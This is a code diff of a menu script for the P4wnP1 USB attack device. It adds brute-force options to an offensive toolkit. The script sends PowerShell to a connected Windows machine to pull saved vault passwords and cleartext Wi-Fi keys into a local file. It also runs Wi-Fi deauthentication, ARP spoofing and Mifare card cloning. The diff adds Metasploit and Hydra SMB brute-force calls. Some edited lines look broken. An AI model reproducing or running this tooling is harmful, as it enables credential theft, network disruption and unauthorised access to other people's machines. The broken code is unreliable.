@@ -1,3 +1,7 @@
+# Edited from https://github.com/FuocomanSap/P4wnp1-ALOA-Menu-Reworked
+# Fixed Local Nmap, deauth, vuln scan (sorta) and others
+# Fixed Host OS detect, added nfc tools
+#!/usr/bin env python3
 # -*- coding:utf-8 -*-
 #imports
 from luma.core.interface.serial import i2c, spi
@@ -43,7 +47,7 @@ def readCapacity(bus):
         return capacity
 
 #this is related to the ups bus not the screen
-bus = smbus.SMBus(1)  # 0 = /dev/i2c-0 (port I2C0), 1 = /dev/i2c-1 (port I2C1)
+#bus = smbus.SMBus(1)  # 0 = /dev/i2c-0 (port I2C0), 1 = /dev/i2c-1 (port I2C1)
 
 GPIO.setwarnings(False)
 #P4wnP1 essential const
@@ -69,7 +73,7 @@ line5 = top+34
 line6 = top+43
 line7 = top+52
 brightness = 255 #Max
-fichier=""
+file=""
 # Move left to right keeping track of the current x position for drawing shapes.
 x = 0
 RST = 25
@@ -237,7 +241,7 @@ def checklist(_list):
     maxi=len(listattack) #number of records
     cur=0
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
@@ -246,25 +250,25 @@ def checklist(_list):
             for n in range(0,7):
                 if n<maxi:
                     if n == cur:
-                        ligne[n] = ">"+listattack[n]
+                        line[n] = ">"+listattack[n]
                     else:
-                        ligne[n] = " "+listattack[n]
+                        line[n] = " "+listattack[n]
                 else:
-                    ligne[n] = ""
+                    line[n] = ""
         else:
             if cur+7<maxi:
                 for n in range (cur,cur + 7):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
             else:
                 for n in range(maxi-8,maxi-1):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
@@ -287,7 +291,7 @@ def checklist(_list):
             #print(retour)
             return(retour)
         #print(str(cur) + " " + listattack[cur])        #debug
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
     return("")
 def displayMsg(msg,t):
@@ -391,10 +395,10 @@ def switch_menu(argument):
         55: "_UpdateOledMenu",
         #newsections
         56: "_Nmap 172.16.0.2",
-        57: "_",
-        58: "_",
-        59: "_",
-        60: "_",
+        57: "_Clone MFClassic",
+        58: "_Write MFClassic",
+        59: "_MSF SMB Bruteforce",
+        60: "_HydraSMB",
         61: "_",
         62: "_",
         #newsections
@@ -485,7 +489,7 @@ def sysinfos():
     #page = 7
 def IdentOS(ips):
     #return os name if found ex. Microsoft Windows 7 ,  Linux 3.X
-    return(shell("nmap -p 22,80,445,65123,56123 -O " + ips + " | grep Running: | cut -d \":\" -f2 | cut -d \"|\" -f1"))
+    return(shell("nmap -p 22,80,445,65123,56123 -O " + ips + " | grep \"Running:\" | cut -d \":\" -f2 | cut -d \"|\" -f1"))
 def OsDetails(ips):
     return(shell("nmap -p 22,80,445,65123,56123 -O " + ips + " | grep \"OS details:\" | cut -d \":\" -f2 | cut -d \",\" -f1"))
 def OLEDContrast(contrast):
@@ -513,7 +517,7 @@ def OLEDContrast(contrast):
                 draw.text((54, line4), "Value : " + str(contrast),  font=font, fill=255)
     return(contrast)
 def splash():
-    img_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'images', 'bootwhat.bmp'))
+    img_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'images', 'threeanonymous.bmp'))
     splash = Image.open(img_path) \
         .transform((device.width, device.height), Image.AFFINE, (1, 0, 0, 0, 1, 0), Image.BILINEAR) \
         .convert(device.mode)
@@ -585,7 +589,7 @@ def FileSelect(path,ext):
     maxi=len(listattack) #number of records
     cur=0
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
@@ -594,25 +598,25 @@ def FileSelect(path,ext):
             for n in range(0,7):
                 if n<maxi:
                     if n == cur:
-                        ligne[n] = ">"+listattack[n]
+                        line[n] = ">"+listattack[n]
                     else:
-                        ligne[n] = " "+listattack[n]
+                        line[n] = " "+listattack[n]
                 else:
-                    ligne[n] = ""
+                    line[n] = ""
         else:
             if cur+7<maxi:
                 for n in range (cur,cur + 7):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
             else:
                 for n in range(maxi-8,maxi-1):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
@@ -632,70 +636,70 @@ def FileSelect(path,ext):
             retour = listattack[cur]+ext
             return(retour)
         #print(str(cur) + " " + listattack[cur])        #debug
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
     return("")
 def templateSelect(liste):
     # GetTemplateList("BLUETOOTH").split("\n")
-    fichier = GetTemplateList(liste).split("\n")
-    maxi = len(fichier)
+    file = GetTemplateList(liste).split("\n")
+    maxi = len(file)
     cur=1
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
-        tok=1
+        tok = 1
         if maxi < 8:
             for n in range(1,8):
-                if n<maxi:
+                if n < maxi:
                     if n == cur:
-                        ligne[n-1] = ">"+fichier[n]
+                        line[n-1] = ">"+file[n]
                     else:
-                        ligne[n-1] = " "+fichier[n]
+                        line[n-1] = " "+file[n]
                 else:
-                    ligne[n-1] = ""
+                    line[n-1] = ""
         else:
-            if cur+7<maxi:
-                for n in range (cur,cur + 7):
+            if cur +7 < maxi:
+                for n in range(0,len(cur, cur + 7)):
                     if n == cur:
-                        ligne[tok-1] = ">"+fichier[n]
+                        line[tok-1] = ">"+file[n]
                     else:
-                        ligne[tok-1] = " "+fichier[n]
-                    tok=tok+1
+                        line[tok-1] = " "+file[n]
+                    tok = tok +1
             else:
                 for n in range(maxi-8,maxi-1):
                     if n == cur:
-                        ligne[tok-1] = ">"+fichier[n]
+                        line[tok-1] = ">"+file[n]
                     else:
-                        ligne[tok-1] = " "+fichier[n]
-                    tok=tok+1
+                        line[tok-1] = " "+file[n]
+                    tok = tok + 1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
         else: # button is pressed:
             cur = cur -1
-            if cur<1:
+            if cur < 1:
                 cur = 1
         if GPIO.input(KEY_DOWN_PIN): # button is released
             menu = 1
         else: # button is pressed:
             cur = cur + 1
-            if cur>maxi-2:
-                cur = maxi-2
+            if cur > maxi -2:
+                cur = maxi -2
         if GPIO.input(KEY_RIGHT_PIN): # button is released
             menu = 1
         else: # button is pressed:
-            retour = fichier[cur]
+            retour = file[cur]
             print(retour)
             return(retour)
         # ----------
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
 def runhid():
     #choose and run (or not) a script
-    fichier = FileSelect(hidpath,".js")
+    file = FileSelect(hidpath,".js")
     time.sleep(0.5)
-    if  fichier == "":
+    if  file == "":
         return()
     while GPIO.input(KEY_LEFT_PIN):
         answer = 0
@@ -704,7 +708,7 @@ def runhid():
                 "YES              YES",
                 "",
                 "",
-                fichier,
+                file,
                 "",
                 "",
                 "NO                NO"
@@ -776,7 +780,7 @@ def runhid():
     )
         if answer == 1:
             # run as background job P4wnP1_cli hid job command
-            cmd = "P4wnP1_cli hid job '" + fichier+"'"
+            cmd = "P4wnP1_cli hid job '" + file+"'"
             result=execcmd(cmd)
             if(result==-1):
                 displayError()
@@ -784,7 +788,7 @@ def runhid():
             return()
         if answer == 3:
             # run hid script directly
-            cmd = "P4wnP1_cli hid run '" + fichier+"'"
+            cmd = "P4wnP1_cli hid run '" + file+"'"
             result=execcmd(cmd)
             if(result==-1):
                 displayError()
@@ -800,7 +804,7 @@ def restart():
     "",
     ""
     )
-    cmd="python3.7 /root/BeBoXGui/runmenu.py &"
+    cmd="python3 /root/BeBoXGui/runmenu.py &"
     exe = execcmd(cmd)
     if(exe==-1):
                 displayError()
@@ -832,15 +836,15 @@ def GetTemplateList(type):
 def ApplyTemplate(template,section):
     print(template)
     print(section)
-    DisplayText(
-                "THERE IS A BUG",
-                "u need to",
-                "do this 2 times",
-                fichier,
-                "bug of P4wnp1",
-                "not mine",
-                "               "
-                )
+    #DisplayText(
+  #             "THERE IS A BUG",
+  #             "u need to",
+  #             "do this 2 times",
+  #             file,
+  #             "bug of P4wnp1",
+  #             "not mine",
+  #             "               "
+  #             )
     time.sleep(3)
     while GPIO.input(KEY_LEFT_PIN):
         answer = 0
@@ -850,7 +854,7 @@ def ApplyTemplate(template,section):
                 "YES              YES",
                 "",
                 "",
-                fichier,
+                file,
                 "",
                 "",
                 "NO                NO"
@@ -872,9 +876,9 @@ def ApplyTemplate(template,section):
             else: # button is pressed:
                 answer = 2
         if answer == 2:
-            return()
+            return() 
         time.sleep(0.5) #pause
-        cmd = "P4wnP1_cli template deploy -" +section + " "+ template+""
+        cmd = "P4wnP1_cli template deploy -" +str(section) + " "+ str(template)+""
         exe = execcmd(cmd)
         if(exe==-1):
                 displayError()
@@ -1080,7 +1084,7 @@ def scanwifi():
     maxi=len(listattack) #number of records
     cur=0
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
@@ -1089,25 +1093,25 @@ def scanwifi():
             for n in range(0,7):
                 if n<maxi:
                     if n == cur:
-                        ligne[n] = ">"+listattack[n]
+                        line[n] = ">"+listattack[n]
                     else:
-                        ligne[n] = " "+listattack[n]
+                        line[n] = " "+listattack[n]
                 else:
-                    ligne[n] = ""
+                    line[n] = ""
         else:
             if cur+7<maxi:
                 for n in range (cur,cur + 7):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
             else:
                 for n in range(maxi-8,maxi-1):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
@@ -1129,7 +1133,7 @@ def scanwifi():
             time.sleep(2)
             return(retour)
         #print(str(cur) + " " + listattack[cur])        #debug
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
     return("")
 
@@ -1192,13 +1196,13 @@ def Osdetection():
             "",
             "",
             "",
-            "      PLEASE WAIT",
+            " Detecting Host OS",
             "",
             "",
             ""
             )
-    os=IdentOS("172.16.0.2")
-    if(str(os)=="b''"):
+    host_os = IdentOS("172.16.0.2")
+    if(str(host_os) == "b''"):
         while GPIO.input(KEY_LEFT_PIN):
             DisplayText(
                 "Experimental nmap OS",
@@ -1211,15 +1215,15 @@ def Osdetection():
                 )
         return
 
-    detail=OsDetails("172.16.0.2")
+    host_detail = OsDetails("172.16.0.2")
 
     while GPIO.input(KEY_LEFT_PIN):
         DisplayText(
             "Experimental nmap OS",
             "detection",
             "",
-            os.replace("Microsoft","MS").replace("Windows","win"),
-            detail.replace("Microsoft","MS").replace("Windows","win"),
+           host_os.replace(b'Microsoft',b'MS').replace(b"Windows",b"win"),
+            host_detail.replace(b"Microsoft",b"MS").replace(b"Windows",b"win"),
             "",
             "Press LEFT to exit"
             )
@@ -1236,14 +1240,14 @@ def socketCreate():
             socketCreate()
         #socketCreate()
     except socket.error as msg:
-        print('socket creation error: ' + str(msg[0]))
+        print(('socket creation error: ' + str(msg[0])))
 def socketBind():
     try:
-        print('Binding socket at port %s'%(port))
+        print(('Binding socket at port %s'%(port)))
         s.bind((host,port))
         s.listen(1)
     except socket.error as msg:
-        print('socket bindig error: ' + str(msg[0]))
+        print(('socket bindig error: ' + str(msg[0])))
         print('Retring...')
         socketBind()
 def socketAccept():
@@ -1252,16 +1256,16 @@ def socketAccept():
     global hostname
     try:
         conn, addr = s.accept()
-        print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
+        print(('[!] Session opened at %s:%s'%(addr[0],addr[1])))
         menu2()
     except socket.error as msg:
-        print('Socket Accepting error: ' + str(msg[0]))
+        print(('Socket Accepting error: ' + str(msg[0])))
 def sendps1(ps1file):
         f=open(ps1file,"r")
         for x in f:
             conn.send(x.encode())
             result = conn.recv(16834)
-            print(result.decode())
+            print((result.decode()))
 def menu2():
     DisplayText(
             "",
@@ -1281,24 +1285,24 @@ def menu2():
         print("Internet is on, on host")
     conn.send("hostname".encode())
     result = conn.recv(16834)
-    print(result.decode().replace("\r\n","")[:-1])
+    print((result.decode().replace("\r\n","")[:-1]))
     hostname = result.decode().replace("\r\n","")[:-1]
     command = "[System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match \"USBKEY\"}|sort {$_.name} |foreach-object {; echo \"$(echo $_.name)\";}"
     conn.send(command.encode())
     result = conn.recv(16834)
     usbkey = result.decode().replace("\r\n","")[:-1]
-    print("Usb key detected in : [" +usbkey+"]")
+    print(("Usb key detected in : [" +usbkey+"]"))
     hack = hostname + "\n"
     hack = hack + "Passwords windows :\n"
     command="$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;"
     conn.send(command.encode())
     result = conn.recv(16834)
-    print(result.decode())
+    print((result.decode()))
     command = "$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }"
     conn.send(command.encode())
     result = conn.recv(16834)
     hack = hack + result.decode()
-    print(result.decode())
+    print((result.decode()))
     DisplayText(
             "",
             "",
@@ -1311,12 +1315,12 @@ def menu2():
     command = "$SSID=((netsh wlan show profiles) -match 'Profil Tous les utilisateurs[^:]+:.(.+)$').replace(\"Profil Tous les utilisateurs\",\"\").replace(\":\",\"\").replace(\" \",\"\").split(\"\\n\");$fin=\"\";"
     conn.send(command.encode())
     result = conn.recv(16834)
-    print(result.decode())
+    print((result.decode()))
     command = "for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match 'Contenu de la c[^:]+:.(.+)$').split(\":\")[1];} catch {};};$fin"
     conn.send(command.encode())
     time.sleep(2)
     result = conn.recv(16834)
-    print(result.decode())
+    print((result.decode()))
     hack = hack + "Wifi : \n" + result.decode()
     DisplayText(
             "",
@@ -1343,7 +1347,7 @@ def menu2():
     f=open("/root/" + hostname+".txt","w+")
     f.write(hack)
     f.close()
-    print(hostname+".txt saved, host is pwned")
+    print((hostname+".txt saved, host is pwned"))
     while 1:
         #cmd = raw_input('PS >')
         cmd ='quit'
@@ -1371,14 +1375,14 @@ def hostselect():
     DisplayText("","","","wait, may take a while ","","","")
     cmd = "hostname -I"
     res = execcmd(cmd)
-    if(res==-1):
+    if(res == -1):
         displayError()
         return()
     subnetIp = res.split(" ")[0].split("'")[1]
     pos = subnetIp.rfind('.')
-    cmd = "nmap -sL -Pn " + str(subnetIp[0:pos]) +".0/24 | grep -v 'Nmap scan report for " + subnetIp[0:2] + "'"
+    cmd = "nmap -sL -Pn " + str(subnetIp[0:pos]) +".0/24 | grep -v 'Nmap scan report for " + str(subnetIp[0:pos]) + "'"
     res = execcmd(cmd)
-    if(res==-1):
+    if(res == -1):
         displayError()
         return()
     hosts = res
@@ -1389,91 +1393,91 @@ def hostselect():
     for i in range(0,len(hostlist)):
         hostlist[i] = hostlist[i][21:]
     #print(hostlist[i][21:])
-    fichier = hostlist
+    file = hostlist
     maxi = len(hostlist)
-    cur=1
+    cur = 1
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
-        tok=1
+        tok = 1
         if maxi < 8:
             for n in range(1,8):
-                if n<maxi:
+                if n < maxi:
                     if n == cur:
-                        ligne[n-1] = ">"+fichier[n]
+                        line[n-1] = ">"+file[n]
                     else:
-                        ligne[n-1] = " "+fichier[n]
+                        line[n-1] = " "+file[n]
                 else:
-                    ligne[n-1] = ""
+                    line[n-1] = ""
         else:
-            if cur+7<maxi:
+            if cur +7 < maxi:
                 for n in range (cur,cur + 7):
                     if n == cur:
-                        ligne[tok-1] = ">"+fichier[n]
+                        line[tok-1] = ">"+file[n]
                     else:
-                        ligne[tok-1] = " "+fichier[n]
-                    tok=tok+1
+                        line[tok-1] = " "+file[n]
+                    tok = tok +1
             else:
-                for n in range(maxi-8,maxi-1):
+                for n in range(maxi -8,maxi -1):
                     if n == cur:
-                        ligne[tok-1] = ">"+fichier[n]
+                        line[tok-1] = ">"+file[n]
                     else:
-                        ligne[tok-1] = " "+fichier[n]
-                    tok=tok+1
+                        line[tok-1] = " "+file[n]
+                    tok = tok +1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
         else: # button is pressed:
             cur = cur -1
-            if cur<1:
+            if cur < 1:
                 cur = 1
         if GPIO.input(KEY_DOWN_PIN): # button is released
             menu = 1
         else: # button is pressed:
             cur = cur + 1
-            if cur>maxi-2:
-                cur = maxi-2
+            if cur > maxi -2:
+                cur = maxi -2
         if GPIO.input(KEY_RIGHT_PIN): # button is released
             menu = 1
         else: # button is pressed:
-            retour = fichier[cur]
-            selected= retour.split("(")[1].split(")")[0]
+            retour = file[cur]
+            selected = retour.split("(")[1].split(")")[0]
             print(selected)
             #return(retour)
             return(selected)
         # ----------
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
 
 def nmap():
     selected = hostselect()
-    choise = 0
-    while(choise == 0):
+    choice = 0
+    while(choice == 0):
         DisplayText("                  YES","","save the nmap?","this will take a while","/BeboXgui/nmap/<IP>.txt   ","","                   NO")
         if (not GPIO.input(KEY1_PIN)): # button is released
-            choise = 1 #A button
+            choice = 1 #A button
         if not GPIO.input(KEY3_PIN): # button is released
-            choise = 2
+            choice = 2
     DisplayText("","","","    wait ","","","")
 
-    if(choise==1):
-        cmd = "nmap -Pn -A -v " + selected + " > nmap/" + selected + ".txt"
+    if(choice == 1):
+        cmd = "nmap -Pn -A -v" + str(selected) + " -oN nmap/"+ str(selected)+".txt" 
         ret = execcmd(cmd)
-        if(ret==-1):
+        if(ret == -1):
             displayError()
             return()
 
 
-        cmd = "cat " + "nmap/" + selected +".txt |  grep -v Discovered | grep  tcp"
+        cmd = "cat nmap/" + str(selected) + ".txt |  grep -v Discovered | grep  tcp"
         ret = execcmd(cmd)
-        if( ret ==-1):
+        if( ret == -1):
             displayError()
             return()
     else:
-        cmd = "nmap -Pn -A " + selected + " | grep tcp"
+        cmd = "nmap -Pn -A" + str(selected) + "| grep tcp"
         ret = execcmd(cmd)
-        if(ret==-1):
+        if(ret == -1):
             displayError()
             return()
 
@@ -1489,36 +1493,37 @@ def nmap():
 
 def nmapLocal():
     selected = "172.16.0.2"
-    choise = 0
-    while(choise == 0):
+    choice = 0
+    while(choice == 0):
         DisplayText("                  YES","","save the nmap?","this will take a while","/BeboXgui/nmap/<IP>.txt   ","","                   NO")
         if (not GPIO.input(KEY1_PIN)): # button is released
-            choise = 1 #A button
+            choice = 1 #A button
         if not GPIO.input(KEY3_PIN): # button is released
-            choise = 2
-    DisplayText("","","","    wait ","","","")
+            choice = 2
+    DisplayText("","","","Nmap Host ","","","")
 
-    if(choise==1):
-        cmd = "nmap -Pn -A " + selected
+    if(choice == 1):
+        cmd = "nmap -Pn -A " + str(selected) + " -oN " + "nmap/" + str(selected) + ".txt"
         ret = execcmd(cmd)
-        if(ret==-1):
+        if(ret == -1):
             displayError()
             return()
-        f = open("nmap/" + str(selected) + ".txt","w+")
-        reportList = str(ret).split("'")[1].split("\\n")
-        for line in reportList:
-            #print(line + "\\n")
-            f.write(line + "\n")
-        f.close()
-        cmd = "cat " + selected +".txt | grep tcp"
+       # f = open("nmap/" + selected + ".txt","w+")
+       # reportList = str(ret).split("'")[1].split("\\n")
+       # for line in reportList:
+           ##print(line + "\\n")
+           # f.write(line + "\n")
+        #f.close() """
+        displayMsg("Scan Complete", 0.5)
+        cmd = "cat nmap/" + selected +".txt | grep tcp"
         ret = execcmd(cmd)
-        if( ret ==-1):
+        if( ret == -1):
             displayError()
             return()
     else:
-        cmd = "nmap -Pn -A " + selected + " | grep tcp"
+        cmd = "nmap -Pn -A 172.16.0.2 | grep tcp"
         ret = execcmd(cmd)
-        if(ret==-1):
+        if(ret == -1):
             displayError()
             return()
 
@@ -1547,7 +1552,7 @@ def update():
         time.sleep(5)
 
 def vulnerabilityScan():
-    DisplayText("Remeber:","Firts u need to","perform an Nmap","and then ","save the output","this is an","experimental feat")
+    DisplayText("Remember:","First u need to","perform an Nmap","and then ","save the output","this is an","experimental feat")
     time.sleep(5)
     DisplayText("","","","Wait","","","")
     selected = FileSelect("/root/BeBoXGui/nmap/",".txt")
@@ -1560,28 +1565,30 @@ def vulnerabilityScan():
         return()
     toSearch = str(res).split("'")[1].split("\\n")
     del toSearch[-1]
-    founded = 0
+    found = 0
     for i in toSearch:
         auxi = i.replace("\t"," ").replace("   "," ").replace("  "," ").split(" ")
         print(auxi)
         i = str(" ".join(auxi[3:]))
-        print("search for: " + i )
-        cmd = "searchsploit " +"'" +  str(i) +"'"
+        print(("search for: " + str(i) ))
+        cmd = "searchsploit " + "\'" +  str(i) + "\'"
         res = execcmd(cmd)
-        if(res==-1):
+        if(res == -1):
             displayError()
             time.sleep(5)
-        if ((str(res).split("'")[1])[1] == "-"):
-            founded +=1
-    print(founded)
-    DisplayText("","","","founded: " + str(founded) ,"","","")
+        if str((res.split("'")[1])[1] == "-"): #removed extra () to fix vuln scan count
+            found += 1
+       
+                                        
+    print(found)
+    DisplayText("","","","found: " +str(found) ,"","","")
     time.sleep(5)
 
 def getSSID():
     #return [name,channel,mac]
     DisplayText("","","wait","","","","")
     #list wifi APs
-    cmd ="airmon-ng start wlan0 && airmon-ng start wlan0mon"
+    cmd = "airmon-ng start wlan0 && airmon-ng start wlan0mon" #airmon-ng startwlan0 &&
     res = execcmd(cmd)
     if(res==-1):
         displayError()
@@ -1646,7 +1653,7 @@ def getSSID():
     maxi=len(listattack) #number of records
     cur=0
     retour = ""
-    ligne = ["","","","","","","",""]
+    line = ["","","","","","","",""]
     time.sleep(0.5)
     while GPIO.input(KEY_LEFT_PIN):
         #on boucle
@@ -1655,25 +1662,25 @@ def getSSID():
             for n in range(0,7):
                 if n<maxi:
                     if n == cur:
-                        ligne[n] = ">"+listattack[n]
+                        line[n] = ">"+listattack[n]
                     else:
-                        ligne[n] = " "+listattack[n]
+                        line[n] = " "+listattack[n]
                 else:
-                    ligne[n] = ""
+                    line[n] = ""
         else:
             if cur+7<maxi:
                 for n in range (cur,cur + 7):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
             else:
                 for n in range(maxi-8,maxi-1):
                     if n == cur:
-                        ligne[tok] = ">"+listattack[n]
+                        line[tok] = ">"+listattack[n]
                     else:
-                        ligne[tok] = " "+listattack[n]
+                        line[tok] = " "+listattack[n]
                     tok=tok+1
         if GPIO.input(KEY_UP_PIN): # button is released
             menu = 1
@@ -1696,7 +1703,7 @@ def getSSID():
             #print(retour)
             return(retour)
         #print(str(cur) + " " + listattack[cur])        #debug
-        DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
+        DisplayText(line[0],line[1],line[2],line[3],line[4],line[5],line[6])
         time.sleep(0.1)
     return("")
 
@@ -1707,7 +1714,7 @@ def deauther():
     DisplayText("this will work","for 10 second","","","","","")
     try:
         target= target.split(",")
-        print(target[2])
+        print((target[2]))
     except:
         displayError()
         return()
@@ -1734,14 +1741,22 @@ def deauther():
         displayError()
         return()
     Popen(['nohup','/bin/bash','touchedcommand.sh'],preexec_fn=os.setpgrp)
-    DisplayText("","","doing the stuff","","","","")
+    DisplayText("","","Deauth all " +str(target[2]) + "","","","","")
     time.sleep(10)
     cmd="rm touchedcommand.sh"
     toDEl = execcmd(cmd)
     if(toDEl==-1):
         displayError()
         return()
-    return()
+   #stop wlan0mon and put wlan0 back up    
+    cmd = "airmon-ng stop wlan0mon && ifconfig wlan0 up"
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        displayMsg("wlan0 up", 1.0)
+        return()
+ 
 
 
 def selectFromCat(cmd,outputFile):
@@ -1762,7 +1777,7 @@ def deautherClient():
     if(not selectedAP):
         displayError()
         return()
-    cmd = " airodump-ng -d " + selectedAP[2] + " -c " + selectedAP[1] + " wlan0mon -w result"
+    cmd = " airodump-ng -d " + str(selectedAP[2]) + " -c " + str(selectedAP[1]) + " wlan0mon -w result"
     #print(cmd)
 
     if(autoKillCommand(cmd,20)==-1):
@@ -1782,7 +1797,7 @@ def deautherClient():
         ret[i] = ret[i].split(",")[0]
     selectedtarget = checklist(ret)
     #print(selectedtarget)
-    displayMsg("Deauthing",1)
+    displayMsg("Deauthing " + str(selectedtarget),1)
     tx1="airodump-ng -c " + str(selectedAP[1] )+" --bssid " + str(selectedAP[2]) + " wlan0mon"
     tx2= "aireplay-ng -0 0 -a " + str(selectedAP[2]) + " -c " + str(selectedtarget)+" wlan0mon"
     print(tx1)
@@ -1799,8 +1814,13 @@ def deautherClient():
     if(ret==-1):
         displayError()
         return()
-
-    return()
+    cmd = "airmon-ng stop wlan0mon && ifconfig wlan0 up"
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        displayMsg("wlan0 up", 1.0)
+        return()
 
 def arpSpoof():
     myTime= 86400
@@ -1818,7 +1838,7 @@ def arpSpoof():
     if(res==-1):
         displayError()
         return()
-    routerIp = (str(res).split("'")[1])[:-2]
+    routerIp = str(res.split("'")[1])[:-2]
     print(routerIp)
     print(victimIP)
     cmd1 = "arpspoof -i wlan0 -t "+ str(victimIP) +" "+ str(routerIp)
@@ -1876,19 +1896,70 @@ def arpSpoof():
         displayError()
         return()
 
+def nfc_clone():
+    cmd = "nfc-mfclassic r a u clone.mfd"
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        displayMsg("Clone Success",0.9)
+        return()
 
+def nfc_write():
+    cmd = "nfc-mfclassic w a u clone.mfd"
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        displayMsg("Write  Success",0.9)
+        return()
 
+def SMBrute():
+    cmd = "msfconsole -r /root/smbtest.rc | grep Success:"
+    DisplayText("","","","Bruteforcing SMB","","","")
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        cred = str(ret).split("'")[1]
+        displayMsg(cred,15)
+        print (cred)
+        return()
 
+def HydraSMB():
+    cmd = "hydra -L /root/users.txt -P /root/password.txt smb2://172.16.0.2" 
+    DisplayText("","","","HydraSMB","","","")
+    ret = execcmd(cmd)
+    if(ret == -1):
+        displayError()
+    else:
+        cred = str(ret).split("login:")[1].split("  password:")
+        cred_disp = ":".join(cred)
+        displayMsg(cred_disp,15)
+        print (cred)
+        return()
+   # res = str(ret).split("'")[1].split("\\n")[:-1]
+   # print(res)
+   # toprint = ["","","","","","",""]
+   # for i in range(0,len(res)):
+   #     if(i>=len(toprint)): break
+   #     toprint[i]="_"+res[i]
+   # DisplayText(toprint[0],toprint[1],toprint[2],toprint[3],toprint[4],toprint[5],toprint[6])
+   # time.sleep(10)   
+   # return()
+   
+
+   # res = str(re
 
 def main():
     socketCreate()
     socketBind()
     socketAccept()
 #init vars
-curseur = 1
+cursor = 1
 page=0
 menu = 1
-ligne = ["","","","","","","",""]
+line = ["","","","","","","",""]
 selection = 0
 if SCNTYPE == 1:
     print("sctype")
@@ -1899,13 +1970,13 @@ while 1:
     if GPIO.input(KEY_UP_PIN): # button is released
         menu = 1
     else: # button is pressed:
-        curseur = curseur -1
-        if curseur<1:
+        cursor = cursor -1
+        if cursor<1:
             if( page == 49):
                 page = 0
             elif (page == 0):
                 page = 49
-            curseur = 7
+            cursor = 7
 
     if GPIO.input(KEY_LEFT_PIN): # button is released
         menu = 1
@@ -1919,171 +1990,179 @@ while 1:
     if GPIO.input(KEY_DOWN_PIN): # button is released
         menu = 1
     else: # button is pressed:
-        curseur = curseur + 1
-        if curseur>7:
+        cursor = cursor + 1
+        if cursor>7:
             if( page == 0):
                 page = 49
             elif (page == 49):
                 page = 0
-            curseur = 1
